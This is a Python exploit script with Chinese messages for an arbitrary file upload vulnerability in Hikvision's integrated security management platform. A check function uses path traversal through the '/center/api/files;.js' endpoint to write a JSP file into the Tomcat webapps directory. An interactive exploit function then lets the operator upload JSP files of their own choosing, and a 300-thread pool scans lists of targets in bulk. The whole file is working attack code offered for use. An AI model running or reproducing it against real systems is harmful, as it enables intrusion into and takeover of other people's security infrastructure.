# 
import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:海康威视 综合安防管理平台软件 files;.js 任意文件上传漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/center/api/files;.js"
	url = target + payload_url
	headers={
		"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
	}
	data="------WebKitFormBoundaryxxmdzwoe\r\nContent-Disposition: form-data; name=\"upload\";filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp\"\r\nContent-Type:image/jpeg\r\n\r\n<%out.println(\"heiheiheii\");%>\r\n------WebKitFormBoundaryxxmdzwoe--"
	# data="--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"11223344\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--"

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "ukgmfyufsi.jsp" in res1.text:
				print(res1.text)
				print(f"{GREEN}[+]该url存在任意文件上传漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
				return True
			else:
				print(f"[-]该url不存在任意文件上传漏洞：{target}")
		else:
			print(f"该url连接失败：{target}")
	except:
		print(f"[*]该url出现错误：{target}")

def exp(target):
	print("----------------------------正在进行漏洞利用-----------------------------------------")
	time.sleep(2)
	payload_url = "/center/api/files;.js"
	url = target + payload_url
	while True:
		file = input("请输入你要上传的文件(输入q退出)：")
		if file == 'q':
			break
		code = input("请输入文件的内容：")
		headers={
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe",
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
		}
		data=f"------WebKitFormBoundaryxxmdzwoe\r\nContent-Disposition: form-data; name=\"upload\";filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{file}\"\r\nContent-Type:image/jpeg\r\n\r\n<%out.println(\"{code}\");%>\r\n------WebKitFormBoundaryxxmdzwoe--"
		res = requests.post(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200 and file in res.text:
			print(f"已上传成功，请访问{target}"+"/clusterMgr/"+f"{file}"+";.js")
		
def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		if poc(args.url):
			exp(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()